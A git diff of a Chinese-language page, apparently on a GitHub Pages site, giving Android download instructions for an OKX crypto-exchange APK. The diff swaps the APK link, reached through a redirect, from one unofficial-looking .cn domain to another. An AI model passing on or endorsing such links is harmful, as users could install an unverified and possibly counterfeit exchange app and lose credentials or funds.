@@ -21,7 +21,7 @@ image: https://cdn.jsdelivr.net/gh/muskcoins/muskcoins.github.io/assets/images/o
 #### 安卓机型
 安卓的话比较简单，大家可以直接打开下面地址进行下载
 
-[点击下载本地安卓apk文件](/302.html?target=https://static.bffjbfa.cn/upgradeapp/okx-android.apk "download")
+[点击下载本地安卓apk文件](/302.html?target=https://static.938w.cn/upgradeapp/okx-android.apk "download")
 
 如果无法下载，点击无效果，请右下角联系平台客服进行处理。
 
